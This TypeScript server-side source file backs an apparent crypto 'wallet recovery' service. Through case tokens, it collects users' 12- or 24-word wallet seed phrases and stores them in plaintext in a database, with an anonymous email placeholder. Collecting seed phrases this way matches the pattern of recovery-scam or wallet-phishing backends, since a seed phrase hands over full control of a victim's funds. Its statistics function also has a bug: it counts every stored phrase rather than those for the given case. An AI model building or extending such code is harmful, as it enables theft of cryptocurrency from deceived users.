'use server';

import { db } from '@/lib/db';
import { findActiveTokenByString, updateTokenLastUsed } from './authToken';
import { WALLET_TYPE } from '@/generated/prisma/client';

export interface RecoverySubmissionData {
	token: string;
	walletType: string;
	phrase: string;
	userEmail?: string;
	createdAt: Date;
}

export interface RecoverySubmissionResult {
	success: boolean;
	message: string;
	data?: {
		phraseId: string;
		caseId: string;
		caseTitle: string;
	};
	error?: string;
}

/**
 * Validates a recovery phrase format
 * @param phrase - The recovery phrase to validate
 * @returns boolean - True if valid, false otherwise
 */
function validateRecoveryPhrase(phrase: string): boolean {
	if (!phrase || typeof phrase !== 'string') {
		return false;
	}

	const words = phrase
		.trim()
		.split(/\s+/)
		.filter((word) => word.length > 0);
	return words.length === 12 || words.length === 24;
}

/**
 * Validates wallet type against enum values
 * @param walletType - The wallet type to validate
 * @returns boolean - True if valid, false otherwise
 */
function validateWalletType(walletType: string): boolean {
	if (!walletType || typeof walletType !== 'string') {
		return false;
	}

	return Object.values(WALLET_TYPE).includes(walletType as WALLET_TYPE);
}

/**
 * Sanitizes the recovery phrase by normalizing whitespace
 * @param phrase - The recovery phrase to sanitize
 * @returns string - The sanitized phrase
 */
function sanitizeRecoveryPhrase(phrase: string): string {
	if (!phrase || typeof phrase !== 'string') {
		return '';
	}

	return phrase
		.trim()
		.split(/\s+/)
		.filter((word) => word.length > 0)
		.map((word) => word.toLowerCase())
		.join(' ');
}

/**
 * Submits a recovery request with auth token verification
 * @param data - Recovery submission data
 * @returns Promise<RecoverySubmissionResult> - The submission result
 */
export async function submitRecoveryRequest(
	data: RecoverySubmissionData
): Promise<RecoverySubmissionResult> {
	try {
		if (!data || typeof data !== 'object') {
			return {
				success: false,
				message: 'Invalid submission data',
				error: 'INVALID_DATA',
			};
		}

		if (
			!data.token ||
			typeof data.token !== 'string' ||
			data.token.trim() === ''
		) {
			return {
				success: false,
				message: 'Auth token is required',
				error: 'MISSING_AUTH_TOKEN',
			};
		}

		if (
			!data.walletType ||
			typeof data.walletType !== 'string' ||
			data.walletType.trim() === ''
		) {
			return {
				success: false,
				message: 'Wallet type is required',
				error: 'MISSING_WALLET_TYPE',
			};
		}

		if (
			!data.phrase ||
			typeof data.phrase !== 'string' ||
			data.phrase.trim() === ''
		) {
			return {
				success: false,
				message: 'Recovery phrase is required',
				error: 'MISSING_RECOVERY_PHRASE',
			};
		}

		if (!validateWalletType(data.walletType)) {
			return {
				success: false,
				message: 'Invalid wallet type selected',
				error: 'INVALID_WALLET_TYPE',
			};
		}

		if (!validateRecoveryPhrase(data.phrase)) {
			return {
				success: false,
				message: 'Recovery phrase must be exactly 12 or 24 words',
				error: 'INVALID_RECOVERY_PHRASE_FORMAT',
			};
		}

		const token = await findActiveTokenByString(data.token.trim());
		if (!token) {
			return {
				success: false,
				message: 'Invalid or expired auth token',
				error: 'INVALID_AUTH_TOKEN',
			};
		}

		const sanitizedPhrase = sanitizeRecoveryPhrase(data.phrase);

		if (!sanitizedPhrase) {
			return {
				success: false,
				message: 'Invalid recovery phrase format',
				error: 'INVALID_RECOVERY_PHRASE_FORMAT',
			};
		}

		const userEmail =
			data.userEmail && data.userEmail.trim()
				? data.userEmail.trim()
				: 'anonymous@recovery.com';

		const existingPhrase = await db.phrase.findFirst({
			where: {
				phrase: sanitizedPhrase,
				walletType: data.walletType as WALLET_TYPE,
				user: {
					email: userEmail,
				},
			},
		});

		if (existingPhrase) {
			return {
				success: false,
				message:
					'This recovery phrase has already been submitted for this wallet type',
				error: 'DUPLICATE_PHRASE',
			};
		}

		const newPhrase = await db.phrase.create({
			data: {
				walletType: data.walletType as WALLET_TYPE,
				createdAt: data.createdAt,
				phrase: sanitizedPhrase,
				user: {
					connectOrCreate: {
						where: {
							email: userEmail,
						},
						create: {
							email: userEmail,
							name: 'Recovery User',
						},
					},
				},
			},
		});

		await updateTokenLastUsed(token.id);

		return {
			success: true,
			message: 'Recovery request submitted successfully',
			data: {
				phraseId: newPhrase.id,
				caseId: token.caseId,
				caseTitle: token.caseTitle,
			},
		};
	} catch (error) {
		console.error('Error submitting recovery request:', error);

		if (error instanceof Error) {
			if (error.message.includes('Unique constraint')) {
				return {
					success: false,
					message: 'This recovery phrase has already been submitted',
					error: 'DUPLICATE_PHRASE',
				};
			}

			if (error.message.includes('Foreign key constraint')) {
				return {
					success: false,
					message: 'Invalid user reference',
					error: 'INVALID_USER_REFERENCE',
				};
			}

			if (error.message.includes('Invalid wallet type')) {
				return {
					success: false,
					message: 'Invalid wallet type provided',
					error: 'INVALID_WALLET_TYPE',
				};
			}
		}

		return {
			success: false,
			message: 'An unexpected error occurred while processing your request',
			error: 'INTERNAL_SERVER_ERROR',
		};
	}
}

/**
 * Verifies if an auth token is valid and active
 * @param tokenString - The token string to verify
 * @returns Promise<{ valid: boolean; caseInfo?: { caseId: string; caseTitle: string }; error?: string }>
 */
export async function verifytoken(tokenString: string): Promise<{
	valid: boolean;
	caseInfo?: { caseId: string; caseTitle: string };
	error?: string;
}> {
	try {
		if (
			!tokenString ||
			typeof tokenString !== 'string' ||
			tokenString.trim() === ''
		) {
			return {
				valid: false,
				error: 'Token is required',
			};
		}

		const token = await findActiveTokenByString(tokenString.trim());

		if (!token) {
			return {
				valid: false,
				error: 'Invalid or expired token',
			};
		}

		return {
			valid: true,
			caseInfo: {
				caseId: token.caseId,
				caseTitle: token.caseTitle,
			},
		};
	} catch (error) {
		console.error('Error verifying auth token:', error);
		return {
			valid: false,
			error: 'Failed to verify token',
		};
	}
}

/**
 * Gets recovery statistics for a specific case
 * @param caseId - The case ID to get stats for
 * @returns Promise with recovery stats
 */
export async function getRecoveryStats(caseId: string): Promise<{
	totalSubmissions: number;
	uniqueWalletTypes: number;
	lastSubmission?: Date;
}> {
	try {
		if (!caseId || typeof caseId !== 'string' || caseId.trim() === '') {
			return {
				totalSubmissions: 0,
				uniqueWalletTypes: 0,
			};
		}

		const tokens = await db.authToken.findMany({
			where: { caseId: caseId.trim() },
			select: { token: true },
		});

		if (tokens.length === 0) {
			return {
				totalSubmissions: 0,
				uniqueWalletTypes: 0,
			};
		}

		const phrases = await db.phrase.findMany({
			select: {
				walletType: true,
				id: true,
				createdAt: true,
			},
			orderBy: {
				createdAt: 'desc',
			},
		});

		const uniqueWalletTypes = new Set(phrases.map((p) => p.walletType));

		return {
			totalSubmissions: phrases.length,
			uniqueWalletTypes: uniqueWalletTypes.size,
			lastSubmission: phrases.length > 0 ? phrases[0].createdAt : undefined,
		};
	} catch (error) {
		console.error('Error getting recovery stats:', error);
		return {
			totalSubmissions: 0,
			uniqueWalletTypes: 0,
		};
	}
}
